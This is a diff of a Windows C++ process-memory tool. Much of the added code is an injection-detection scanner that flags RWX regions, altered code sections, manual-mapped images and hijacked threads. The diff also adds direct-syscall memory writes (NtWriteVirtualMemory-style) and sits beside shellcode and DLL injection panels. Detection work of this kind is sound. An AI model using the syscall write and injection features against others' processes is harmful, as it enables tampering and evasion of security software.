+    PVOID addr = baseAddress;
+    SIZE_T size = regionSize;
+    ULONG oldp = 0;
+    NTSTATUS status = fn(process, &addr, &size, newProtect, &oldp);
+    if (oldProtect) *oldProtect = oldp;
+    VirtualFree(stub, 0, MEM_RELEASE);
+    return status >= 0;
+}
+
+bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect, bool useSyscall) {
     if (!hProcess || !address) return false;
     BYTE buf[16] = {};
     size_t sz = 4;
@@ -1548,7 +1965,7 @@ bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect) {
     switch (dt) {
         case DT_INT8:  { int8_t  v=(int8_t)atoi(str);   memcpy(buf,&v,1); sz=1; break; }
         case DT_INT16: { int16_t v=(int16_t)atoi(str);  memcpy(buf,&v,2); sz=2; break; }
-        case DT_INT64: { int64_t v=(int64_t)_atoi64(str);memcpy(buf,&v,8);sz=8; break; }
+        case DT_INT64: { int64_t v=_strtoi64(str,NULL,10); memcpy(buf,&v,8); sz=8; break; }
         case DT_FLOAT: { float   v=(float)atof(str);    memcpy(buf,&v,4); sz=4; break; }
         case DT_DOUBLE:{ double  v=atof(str);            memcpy(buf,&v,8); sz=8; break; }
         case DT_STRING:{ sz=strlen(str)+1; varBytes.assign(str,str+sz); isVar=true; break; }
@@ -1561,9 +1978,24 @@ bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect) {
     }
     const BYTE* data = isVar ? varBytes.data() : buf;
     DWORD oldProt = 0;
-    if (protect) VirtualProtectEx(hProcess,address,sz,PAGE_EXECUTE_READWRITE,&oldProt);
-    SIZE_T w; bool ok = WriteProcessMemory(hProcess,address,data,sz,&w) && w==sz;
-    if (protect && oldProt) VirtualProtectEx(hProcess,address,sz,oldProt,&oldProt);
+    if (protect) {
+        if (useSyscall) {
+            if (!SyscallProtectVirtualMemory(hProcess,address,sz,PAGE_EXECUTE_READWRITE,&oldProt)) return false;
+        } else {
+            if (!VirtualProtectEx(hProcess,address,sz,PAGE_EXECUTE_READWRITE,&oldProt)) return false;
+        }
+    }
+    SIZE_T w = 0;
+    bool ok = false;
+    if (useSyscall) {
+        ok = SyscallWriteVirtualMemory(hProcess,address,data,sz,&w);
+    } else {
+        ok = WriteProcessMemory(hProcess,address,data,sz,&w) && w==sz;
+    }
+    if (protect && oldProt) {
+        if (useSyscall) SyscallProtectVirtualMemory(hProcess,address,sz,oldProt,nullptr);
+        else VirtualProtectEx(hProcess,address,sz,oldProt,&oldProt);
+    }
     return ok;
 }
 
@@ -1572,9 +2004,10 @@ void WriteAllScanResults() {
     int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
     char valStr[512]={};GetWindowTextA(hEditNewValue,valStr,512);
     bool prot=(SendMessage(hChkProtect,BM_GETCHECK,0,0)==BST_CHECKED);
+    bool useSyscall=(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED);
     int ok=0,fail=0;
-    for (LPVOID addr:scanResults){if(WriteTypedValue(addr,valStr,dt,prot))ok++;else fail++;}
-    char msg[128];sprintf_s(msg,"Bulk write: %d OK, %d failed (of %zu)",ok,fail,scanResults.size());
+    for (LPVOID addr:scanResults){if(WriteTypedValue(addr,valStr,dt,prot,useSyscall))ok++;else fail++;}
+    char msg[128];sprintf_s(msg,"Bulk write: %d OK, %d failed (of %zu)%s",ok,fail,scanResults.size(),useSyscall?" (syscall)":"");
     LogToStatus(msg);
 }
 
@@ -1738,6 +2171,412 @@ LRESULT CALLBACK TabPageProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
 }
 
 
+static bool ReadDiskFileFully(const char* path, std::vector<BYTE>& out){
+    HANDLE h=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+                         NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+    if(h==INVALID_HANDLE_VALUE)return false;
+    LARGE_INTEGER sz;
+    if(!GetFileSizeEx(h,&sz)||sz.QuadPart<=0||sz.QuadPart>0x10000000){CloseHandle(h);return false;}
+    out.resize((size_t)sz.QuadPart);
+    DWORD got=0;
+    BOOL ok=ReadFile(h,out.data(),(DWORD)out.size(),&got,NULL);
+    CloseHandle(h);
+    return ok&&got==out.size();
+}
+
+struct ModRange { uintptr_t base; uintptr_t end; std::string name; };
+
+static void CompareExecSections(LPVOID modBase,const char* modPath,const std::string& modName,
+                                std::vector<BYTE>& disk, int& findingsAdded){
+    if(disk.size()<sizeof(IMAGE_DOS_HEADER))return;
+    IMAGE_DOS_HEADER* dDos=(IMAGE_DOS_HEADER*)disk.data();
+    if(dDos->e_magic!=IMAGE_DOS_SIGNATURE)return;
+    if((size_t)dDos->e_lfanew+sizeof(IMAGE_NT_HEADERS)>disk.size())return;
+    IMAGE_NT_HEADERS* dNt=(IMAGE_NT_HEADERS*)(disk.data()+dDos->e_lfanew);
+    if(dNt->Signature!=IMAGE_NT_SIGNATURE)return;
+#ifdef _WIN64
+    if(dNt->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64)return;
+#else
+    if(dNt->FileHeader.Machine!=IMAGE_FILE_MACHINE_I386)return;
+#endif
+    WORD nSec=dNt->FileHeader.NumberOfSections;
+    IMAGE_SECTION_HEADER* dSec=IMAGE_FIRST_SECTION(dNt);
+    SIZE_T r=0;
+    for(WORD i=0;i<nSec;i++){
+        IMAGE_SECTION_HEADER& s=dSec[i];
+        if(!(s.Characteristics&IMAGE_SCN_MEM_EXECUTE))continue;
+        DWORD vs=s.Misc.VirtualSize, rs=s.SizeOfRawData;
+        DWORD cmp=vs<rs?vs:rs;
+        if(cmp==0)continue;
+        if(cmp>0x200000)cmp=0x200000;
+        if((size_t)s.PointerToRawData+cmp>disk.size())continue;
+        std::vector<BYTE> mem(cmp);
+        if(!ReadProcessMemory(hProcess,(LPVOID)((BYTE*)modBase+s.VirtualAddress),mem.data(),cmp,&r)||r!=cmp)continue;
+        const BYTE* fbuf=disk.data()+s.PointerToRawData;
+        size_t diff=0,maxRun=0,curRun=0,firstDiff=(size_t)-1;
+        for(size_t k=0;k<cmp;k++){
+            if(mem[k]!=fbuf[k]){
+                diff++;
+                if(firstDiff==(size_t)-1)firstDiff=k;
+                curRun++; if(curRun>maxRun)maxRun=curRun;
+            } else curRun=0;
+        }
+        bool suspicious=(diff*20>cmp)||maxRun>32;
+        if(diff==0)continue;
+        char secName[9]={}; memcpy(secName,s.Name,8);
+        char line[640];
+        sprintf_s(line,"  %s  %-24s %-8s diff=%zu/%lu (%.1f%%) maxRun=%zu  firstDiff=0x%llX",
+            suspicious?"[SUSPICIOUS]":"[minor]   ",
+            modName.c_str(),secName,diff,(unsigned long)cmp,
+            100.0*(double)diff/(double)cmp,maxRun,
+            (unsigned long long)((uintptr_t)modBase+s.VirtualAddress+firstDiff));
+        AppendEditText(hLstDetect,line);
+        if(suspicious)findingsAdded++;
+    }
+}
+
+void RunInjectionDetection(){
+    if(!hProcess||!currentPID){LogToStatus("Attach to a process first",true);return;}
+    ClearEditText(hLstDetect);
+
+    bool doRx     =SendMessage(hChkDetectRx,    BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doStomp  =SendMessage(hChkDetectStomp, BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doMapped =SendMessage(hChkDetectMapped,BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doThread =SendMessage(hChkDetectThread,BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doRwx    =SendMessage(hChkDetectRwx,   BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doManMap =SendMessage(hChkDetectManMap,BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doHijack =SendMessage(hChkDetectHijack,BM_GETCHECK,0,0)==BST_CHECKED;
+    bool doPath   =SendMessage(hChkDetectPath,  BM_GETCHECK,0,0)==BST_CHECKED;
+
+    char hdr[256];
+    sprintf_s(hdr,"=== INJECTION DETECTION SCAN  PID=%d ===",currentPID);
+    AppendEditText(hLstDetect,hdr);
+    AppendEditText(hLstDetect,"");
+
+    std::vector<ModRange> ranges;
+    {
+        HMODULE mods[1024]; DWORD needed=0;
+        if(EnumProcessModules(hProcess,mods,sizeof(mods),&needed)){
+            DWORD count=needed/sizeof(HMODULE);
+            for(DWORD i=0;i<count&&i<1024;i++){
+                MODULEINFO mi={};
+                if(!GetModuleInformation(hProcess,mods[i],&mi,sizeof(mi)))continue;
+                char modPath[MAX_PATH]={};
+                GetModuleFileNameExA(hProcess,mods[i],modPath,MAX_PATH);
+                const char* nm=strrchr(modPath,'\\'); nm=nm?nm+1:modPath;
+                ModRange mr;
+                mr.base=(uintptr_t)mi.lpBaseOfDll;
+                mr.end =mr.base+mi.SizeOfImage;
+                mr.name=nm;
+                ranges.push_back(mr);
+            }
+        }
+    }
+    auto inAnyModule=[&](uintptr_t a)->const char*{
+        for(auto& r:ranges)if(a>=r.base&&a<r.end)return r.name.c_str();
+        return NULL;
+    };
+
+    int totalFindings=0;
+
+    if(doRx||doMapped||doRwx){
+        AppendEditText(hLstDetect,"--- [1] EXECUTABLE MEMORY REGIONS ---");
+        AppendEditText(hLstDetect,"  Type   Protection    Base                 Size         Backing");
+        SYSTEM_INFO si; GetSystemInfo(&si);
+        LPVOID a=si.lpMinimumApplicationAddress;
+        int n=0,flagged=0;
+        while(a<si.lpMaximumApplicationAddress&&n<200000){
+            MEMORY_BASIC_INFORMATION mbi;
+            if(VirtualQueryEx(hProcess,a,&mbi,sizeof(mbi))!=sizeof(mbi))break;
+            n++;
+            if(mbi.State==MEM_COMMIT){
+                bool exec=(mbi.Protect&(PAGE_EXECUTE|PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_WRITECOPY))!=0;
+                if(exec){
+                    bool flag=false; const char* why="";
+                    bool rwx=(mbi.Protect&PAGE_EXECUTE_READWRITE)!=0;
+                    if(doRwx && rwx){
+                        flag=true;
+                        if      (mbi.Type==MEM_IMAGE)   why="[!!] IMAGE+RWX  module page is RWX (very suspicious)";
+                        else if (mbi.Type==MEM_PRIVATE) why="[!!] PRIVATE+RWX  shellcode write+exec region";
+                        else if (mbi.Type==MEM_MAPPED)  why="[!!] MAPPED+RWX  RWX section-mapped";
+                        else                            why="[!!] RWX  region is writable+executable";
+                    }
+                    else if(doRx&&mbi.Type==MEM_PRIVATE){flag=true; why="PRIVATE  shellcode-style region (no file backing)";}
+                    else if(doMapped&&mbi.Type==MEM_MAPPED){flag=true; why="MAPPED   section-based map (NtMapViewOfSection-style)";}
+                    if(flag){
+                        const char* prot="EXEC";
+                        if     (mbi.Protect&PAGE_EXECUTE_READWRITE)prot="EXEC+RW";
+                        else if(mbi.Protect&PAGE_EXECUTE_WRITECOPY)prot="EXEC+WC";
+                        else if(mbi.Protect&PAGE_EXECUTE_READ)     prot="EXEC+R";
+                        else if(mbi.Protect&PAGE_EXECUTE)          prot="EXEC";
+                        char fname[MAX_PATH]={};
+                        DWORD fl=GetMappedFileNameA(hProcess,mbi.BaseAddress,fname,MAX_PATH);
+                        const char* fb=fl?fname:"(none)";
+                        char line[640];
+                        sprintf_s(line,"  %s  0x%016llX  %10s   %s",
+                            prot,(unsigned long long)(uintptr_t)mbi.BaseAddress,
+                            FormatMemorySize(mbi.RegionSize).c_str(),why);
+                        AppendEditText(hLstDetect,line);
+                        char line2[640];
+                        sprintf_s(line2,"         file: %s",fb);
+                        AppendEditText(hLstDetect,line2);
+                        flagged++; totalFindings++;
+                    }
+                }
+            }
+            a=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
+        }
+        char sum[128];
+        sprintf_s(sum,"  -> %d executable region(s) flagged out of %d total",flagged,n);
+        AppendEditText(hLstDetect,sum);
+        AppendEditText(hLstDetect,"");
+    }
+
+    if(doStomp){
+        AppendEditText(hLstDetect,"--- [2] MODULE CODE INTEGRITY (.text divergence vs disk) ---");
+        AppendEditText(hLstDetect,"  Note: a small number of byte differences is normal (IAT/hot-patch). Look for [SUSPICIOUS].");
+        int suspBefore=totalFindings;
+        for(auto& r:ranges){
+            char modPath[MAX_PATH]={};
+            HMODULE mh=(HMODULE)(uintptr_t)r.base;
+            if(!GetModuleFileNameExA(hProcess,mh,modPath,MAX_PATH))continue;
+            std::vector<BYTE> disk;
+            if(!ReadDiskFileFully(modPath,disk))continue;
+            int added=0;
+            CompareExecSections((LPVOID)r.base,modPath,r.name,disk,added);
+            totalFindings+=added;
+        }
+        char sum[128];
+        sprintf_s(sum,"  -> %d module(s) with suspicious .text divergence",totalFindings-suspBefore);
+        AppendEditText(hLstDetect,sum);
+        AppendEditText(hLstDetect,"");
+    }
+
+    if(doThread){
+        AppendEditText(hLstDetect,"--- [3] THREAD START ADDRESSES OUTSIDE ANY LOADED MODULE ---");
+        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
+        int flagged=0,total=0;
+        if(snap!=INVALID_HANDLE_VALUE){
+            THREADENTRY32 te; te.dwSize=sizeof(te);
+            typedef NTSTATUS(WINAPI*NtQIT)(HANDLE,int,PVOID,ULONG,PULONG);
+            static NtQIT fn=(NtQIT)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQueryInformationThread");
+            if(Thread32First(snap,&te)){
+                do{
+                    if(te.th32OwnerProcessID!=currentPID)continue;
+                    total++;
+                    PVOID sa=NULL;
+                    HANDLE hTh=OpenThread(THREAD_QUERY_INFORMATION,FALSE,te.th32ThreadID);
+                    if(hTh){
+                        if(fn)fn(hTh,9,&sa,sizeof(sa),NULL);
+                        CloseHandle(hTh);
+                    }
+                    if(!sa)continue;
+                    const char* mod=inAnyModule((uintptr_t)sa);
+                    if(!mod){
+                        MEMORY_BASIC_INFORMATION mbi={};
+                        const char* kind="UNKNOWN";
+                        if(VirtualQueryEx(hProcess,sa,&mbi,sizeof(mbi))==sizeof(mbi)){
+                            if(mbi.Type==MEM_PRIVATE)kind="PRIVATE";
+                            else if(mbi.Type==MEM_MAPPED)kind="MAPPED";
+                            else if(mbi.Type==MEM_IMAGE)kind="IMAGE(unlinked?)";
+                        }
+                        char line[256];
+                        sprintf_s(line,"  [SUSPICIOUS] TID=%-8lu start=0x%p  region=%s  not in any loaded module",
+                            te.th32ThreadID,sa,kind);
+                        AppendEditText(hLstDetect,line);
+                        flagged++; totalFindings++;
+                    }
+                }while(Thread32Next(snap,&te));
+            }
+            CloseHandle(snap);
+        }
+        char sum[128];
+        sprintf_s(sum,"  -> %d/%d thread(s) with start address outside any loaded module",flagged,total);
+        AppendEditText(hLstDetect,sum);
+        AppendEditText(hLstDetect,"");
+    }
+
+    if(doManMap){
+        AppendEditText(hLstDetect,"--- [4] MANUAL-MAPPED PE IMAGES (PE in memory not in module list) ---");
+        AppendEditText(hLstDetect,"  Note: catches reflective loaders / manual mappers that bypass LoadLibrary.");
+        AppendEditText(hLstDetect,"  Some legitimate runtimes (.NET dynamic assemblies) may also appear here.");
+        SYSTEM_INFO si; GetSystemInfo(&si);
+        LPVOID a=si.lpMinimumApplicationAddress;
+        int n=0,flagged=0;
+        while(a<si.lpMaximumApplicationAddress&&n<200000){
+            MEMORY_BASIC_INFORMATION mbi;
+            if(VirtualQueryEx(hProcess,a,&mbi,sizeof(mbi))!=sizeof(mbi))break;
+            n++;
+            if(mbi.State==MEM_COMMIT && mbi.Type!=MEM_IMAGE && mbi.RegionSize>=0x1000){
+                uintptr_t base=(uintptr_t)mbi.BaseAddress;
+                if(!inAnyModule(base)){
+                    BYTE hdr[0x400]={};
+                    SIZE_T r=0;
+                    SIZE_T toRead=sizeof(hdr); if(toRead>mbi.RegionSize)toRead=mbi.RegionSize;
+                    if(ReadProcessMemory(hProcess,(LPVOID)base,hdr,toRead,&r)&&r>=sizeof(IMAGE_DOS_HEADER)){
+                        IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)hdr;
+                        if(dos->e_magic==IMAGE_DOS_SIGNATURE && dos->e_lfanew>0 &&
+                           (size_t)dos->e_lfanew+sizeof(IMAGE_NT_HEADERS)<=r){
+                            IMAGE_NT_HEADERS* nt=(IMAGE_NT_HEADERS*)(hdr+dos->e_lfanew);
+                            if(nt->Signature==IMAGE_NT_SIGNATURE){
+                                const char* tstr=mbi.Type==MEM_PRIVATE?"PRIVATE":(mbi.Type==MEM_MAPPED?"MAPPED":"OTHER");
+                                char line[320];
+                                sprintf_s(line,"  [SUSPICIOUS] PE image at 0x%016llX  size=%s  type=%s  not in loaded module list",
+                                    (unsigned long long)base,
+                                    FormatMemorySize(mbi.RegionSize).c_str(), tstr);
+                                AppendEditText(hLstDetect,line);
+                                flagged++; totalFindings++;
+                            }
+                        }
+                    }
+                }
+            }
+            a=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
+        }
+        char sum[128];
+        sprintf_s(sum,"  -> %d manually-mapped PE image(s) detected",flagged);
+        AppendEditText(hLstDetect,sum);
+        AppendEditText(hLstDetect,"");
+    }
+
+    if(doHijack){
+        AppendEditText(hLstDetect,"--- [5] THREAD CONTEXT HIJACK CHECK (current RIP outside any module) ---");
+        AppendEditText(hLstDetect,"  Note: briefly suspends each thread to read its context. Avoid on system-critical processes.");
+        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
+        int flagged=0,total=0;
+        if(snap!=INVALID_HANDLE_VALUE){
+            THREADENTRY32 te; te.dwSize=sizeof(te);
+            if(Thread32First(snap,&te)){
+                do{
+                    if(te.th32OwnerProcessID!=currentPID)continue;
+                    total++;
+                    HANDLE hTh=OpenThread(THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME|THREAD_QUERY_INFORMATION,FALSE,te.th32ThreadID);
+                    if(!hTh)continue;
+                    DWORD prev=SuspendThread(hTh);
+                    if(prev==(DWORD)-1){CloseHandle(hTh);continue;}
+                    CONTEXT ctx={}; ctx.ContextFlags=CONTEXT_CONTROL;
+                    BOOL ok=GetThreadContext(hTh,&ctx);
+                    ResumeThread(hTh);
+                    if(ok){
+#ifdef _WIN64
+                        uintptr_t rip=(uintptr_t)ctx.Rip;
+#else
+                        uintptr_t rip=(uintptr_t)ctx.Eip;
+#endif
+                        if(rip && !inAnyModule(rip)){
+                            MEMORY_BASIC_INFORMATION mbi={};
+                            const char* kind="UNKNOWN";
+                            if(VirtualQueryEx(hProcess,(LPVOID)rip,&mbi,sizeof(mbi))==sizeof(mbi)){
+                                if      (mbi.Type==MEM_PRIVATE) kind="PRIVATE";
+                                else if (mbi.Type==MEM_MAPPED)  kind="MAPPED";
+                                else if (mbi.Type==MEM_IMAGE)   kind="IMAGE(unlinked?)";
+                            }
+                            char line[256];
+                            sprintf_s(line,"  [SUSPICIOUS] TID=%-8lu RIP=0x%016llX  region=%s  outside loaded modules (possible hijack)",
+                                te.th32ThreadID,(unsigned long long)rip,kind);
+                            AppendEditText(hLstDetect,line);
+                            flagged++; totalFindings++;
+                        }
+                    }
+                    CloseHandle(hTh);
+                }while(Thread32Next(snap,&te));
+            }
+            CloseHandle(snap);
+        }
+        char sum[128];
+        sprintf_s(sum,"  -> %d/%d thread(s) executing outside any loaded module",flagged,total);
+        AppendEditText(hLstDetect,sum);
+        AppendEditText(hLstDetect,"");
+    }
+
+    if(doPath){
+        AppendEditText(hLstDetect,"--- [6] MODULES LOADED FROM SUSPICIOUS PATHS ---");
+        auto containsCI=[](const char* s,const char* sub)->bool{
+            if(!s||!sub)return false;
+            size_t sl=strlen(s),tl=strlen(sub);
+            if(tl==0||tl>sl)return false;
+            for(size_t i=0;i+tl<=sl;i++){
+                bool m=true;
+                for(size_t j=0;j<tl;j++){
+                    char a=s[i+j],b=sub[j];
+                    if(a>='A'&&a<='Z')a+=32;
+                    if(b>='A'&&b<='Z')b+=32;
+                    if(a!=b){m=false;break;}
+                }
+                if(m)return true;
+            }
+            return false;
+        };
+        int flagged=0;
+        for(auto& r:ranges){
+            char modPath[MAX_PATH]={};
+            HMODULE mh=(HMODULE)(uintptr_t)r.base;
+            if(!GetModuleFileNameExA(hProcess,mh,modPath,MAX_PATH))continue;
+            const char* hit=NULL;
+            if      (containsCI(modPath,"\\AppData\\Local\\Temp\\")) hit="AppData\\Local\\Temp";
+            else if (containsCI(modPath,"\\Temp\\"))                 hit="Temp";
+            else if (containsCI(modPath,"\\Downloads\\"))            hit="Downloads";
+            else if (containsCI(modPath,"\\Users\\Public\\"))        hit="Users\\Public";
+            else if (containsCI(modPath,"\\ProgramData\\"))          hit="ProgramData";
+            else if (containsCI(modPath,"\\AppData\\Roaming\\"))     hit="AppData\\Roaming";
+            if(hit){
+                char line[640];
+                sprintf_s(line,"  [SUSPICIOUS] %-24s loaded from %s",r.name.c_str(),hit);
+                AppendEditText(hLstDetect,line);
+                char line2[MAX_PATH+32];
+                sprintf_s(line2,"           path: %s",modPath);
+                AppendEditText(hLstDetect,line2);
+                flagged++; totalFindings++;
+            }
+        }
+        char sum[128];
+        sprintf_s(sum,"  -> %d module(s) loaded from suspicious paths",flagged);
+        AppendEditText(hLstDetect,sum);
+        AppendEditText(hLstDetect,"");
+    }
+
+    AppendEditText(hLstDetect,"=== SCAN COMPLETE ===");
+    char done[128];
+    sprintf_s(done,"Detection scan: %d total finding(s).",totalFindings);
+    LogToStatus(done);
+}
+
+static HMODULE FindModuleByPath(DWORD pid, const char* fullPath) {
+    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (!h) return NULL;
+    HMODULE mods[1024];
+    DWORD needed;
+    if (EnumProcessModulesEx(h, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) {
+        DWORD count = needed / sizeof(HMODULE);
+        for (DWORD i = 0; i < count; i++) {
+            char path[MAX_PATH];
+            if (GetModuleFileNameExA(h, mods[i], path, MAX_PATH)) {
+                if (_stricmp(path, fullPath) == 0) {
+                    CloseHandle(h);
+                    return mods[i];
+                }
+            }
+        }
+    }
+    CloseHandle(h);
+    return NULL;
+}
+
+static DWORD GetExportRVA(const char* dllPath, const char* funcName) {
+    HMODULE hLocal = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (!hLocal) return 0;
+    FARPROC localAddr = GetProcAddress(hLocal, funcName);
+    if (!localAddr) {
+        FreeLibrary(hLocal);
+        return 0;
+    }
+    HMODULE localBase = GetModuleHandleA(dllPath);
+    if (!localBase) localBase = hLocal;
+    DWORD rva = (DWORD)((uintptr_t)localAddr - (uintptr_t)localBase);
+    FreeLibrary(hLocal);
+    return rva;
+}
+
 LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
     switch(msg){
 
@@ -1821,7 +2660,9 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
          ti.pszText=(LPSTR)"Memory Scanner"; TabCtrl_InsertItem(hTabCtrl,0,&ti);
          ti.pszText=(LPSTR)"Modules & DLL";  TabCtrl_InsertItem(hTabCtrl,1,&ti);
          ti.pszText=(LPSTR)"Cde Inj"; TabCtrl_InsertItem(hTabCtrl,2,&ti);
-         ti.pszText=(LPSTR)"Window Writer";  TabCtrl_InsertItem(hTabCtrl,3,&ti);}
+         ti.pszText=(LPSTR)"Window Writer";  TabCtrl_InsertItem(hTabCtrl,3,&ti);
+         ti.pszText=(LPSTR)"Detect Inj";     TabCtrl_InsertItem(hTabCtrl,4,&ti);
+         ti.pszText=(LPSTR)"Shellcode Exec"; TabCtrl_InsertItem(hTabCtrl,5,&ti);}
         RECT tabRc;GetClientRect(hTabCtrl,&tabRc);
         TabCtrl_AdjustRect(hTabCtrl,FALSE,&tabRc);
         int px=tabRc.left,py=tabRc.top,pw=tabRc.right-tabRc.left,ph=tabRc.bottom-tabRc.top;
@@ -1833,6 +2674,8 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         hPageMods  =CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
         hPageInject=CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
         hPageWnd   =CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
+        hPageDetect=CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,          px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
+        hPageShellcode=CreateWindowA("MemPage","",WS_CHILD|WS_CLIPSIBLINGS,       px,py,pw,ph,hTabCtrl,NULL,hInst,NULL);
 
         hHdrScan=B(hPageScan,"STATIC","MEMORY SCANNING",0,5,5,220,18,0,hFontSection);
 
@@ -1881,14 +2724,15 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
 
         hHdrWrite=B(hPageScan,"STATIC","VALUE MODIFICATION",0,1242,322,280,18,0,hFontSection);
         hChkProtect=B(hPageScan,"BUTTON","Bypass read-only (VirtualProtectEx)",BS_AUTOCHECKBOX,1530,320,340,20,ID_CHK_PROTECT_WR,hFontSmall);
-        B(hPageScan,"STATIC","Value:",0,1242,348,44,22,0);
-        hEditNewValue=B(hPageScan,"EDIT","",WS_BORDER,1289,346,200,24,0,hFontMono);
-        B(hPageScan,"BUTTON","Read",    0,1494,346,50,24,ID_BTN_READ_VAL);
-        hBtnWrite =B(hPageScan,"BUTTON","Write",   0,1548,346,58,24,ID_BTN_WRITE);
-        B(hPageScan,"BUTTON","Write All",0,1610,346,70,24,ID_BTN_WRITE_ALL);
-        hBtnUndo  =B(hPageScan,"BUTTON","Undo",   0,1684,346,50,24,ID_BTN_UNDO);
-        hBtnFreeze=B(hPageScan,"BUTTON","Freeze", 0,1738,346,64,24,ID_BTN_FREEZE);
-        B(hPageScan,"STATIC","(Write All: write to every scan result at once)",0,1242,374,560,16,0,hFontSmall);
+        hChkSyscall=B(hPageScan,"BUTTON","Use syscall write (NtWriteVirtualMemory)",BS_AUTOCHECKBOX,1530,345,340,20,ID_CHK_SYSCALL_WR,hFontSmall);
+        B(hPageScan,"STATIC","Value:",0,1242,378,44,22,0);
+        hEditNewValue=B(hPageScan,"EDIT","",WS_BORDER,1289,376,200,24,0,hFontMono);
+        B(hPageScan,"BUTTON","Read",    0,1494,376,50,24,ID_BTN_READ_VAL);
+        hBtnWrite =B(hPageScan,"BUTTON","Write",   0,1548,376,58,24,ID_BTN_WRITE);
+        B(hPageScan,"BUTTON","Write All",0,1610,376,70,24,ID_BTN_WRITE_ALL);
+        hBtnUndo  =B(hPageScan,"BUTTON","Undo",   0,1684,376,50,24,ID_BTN_UNDO);
+        hBtnFreeze=B(hPageScan,"BUTTON","Freeze", 0,1738,376,64,24,ID_BTN_FREEZE);
+        B(hPageScan,"STATIC","(Write All: write to every scan result at once)",0,1242,406,560,16,0,hFontSmall);
 
         hHdrStrWriter=B(hPageScan,"STATIC","STRING WRITER  (UTF-8 / UTF-16 to selected addr)",0,1242,398,430,18,0,hFontSection);
         hEditStrWrite=B(hPageScan,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,1242,420,350,24,ID_EDIT_STR_WRITE,hFontMono);
@@ -1918,6 +2762,8 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         B(hPageMods,"BUTTON","Refresh",0,1780,3,80,22,ID_BTN_REFRESH_MODS);
         B(hPageMods,"BUTTON","Eject Selected",0,1864,3,95,22,ID_BTN_EJECT_DLL);
         hLstModules=MakeDE(hPageMods,5,28,1890,620,ID_LST_MODULES);
+
+        B(hPageMods, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1635, 3, 140, 22, ID_BTN_HELP_MODULES, hFontSmall);
         
         hHdrDllInject=B(hPageMods,"STATIC","DLL INJ",0,5,656,200,18,0,hFontSection);
         B(hPageMods,"STATIC","DLL path:",0,5,682,65,22,0);
@@ -1929,6 +2775,7 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
 
         
         hHdrInject=B(hPageInject,"STATIC","SHCODE INJ",0,5,5,300,18,0,hFontSection);
+        B(hPageInject, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1700, 5, 140, 24, ID_BTN_HELP_INJECT, hFontSmall);
         B(hPageInject,"STATIC","Hex bytes (space-separated, e.g. 90 90 C3):",0,5,28,400,18,0,hFontSmall);
         hEditShellcode=B(hPageInject,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,5,50,640,26,ID_EDIT_SHELLCODE,hFontMono);
         B(hPageInject,"STATIC","Prot:",0,5,84,38,22,0);
@@ -1979,6 +2826,7 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         hStaticSelWnd=B(hPageWnd,"STATIC","Selected: None  (click a line in the list below)",0,5,28,1880,18,0,hFontSmall);
         
         hLstWindows=MakeDE(hPageWnd,5,50,1205,560,ID_LST_WINDOWS);
+        B(hPageWnd, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1510, 3, 160, 22, ID_BTN_HELP_WNDWRITER, hFontSmall);
         g_origWndListProc=(WNDPROC)SetWindowLongPtrA(hLstWindows,GWLP_WNDPROC,(LONG_PTR)WndListSubclassProc);
         
         B(hPageWnd,"STATIC","Text to set:",0,5,620,88,22,0);
@@ -2009,7 +2857,65 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         B(hPageWnd,"BUTTON","Restore", 0,1403,106,90,26,ID_BTN_WND_RESTORE);
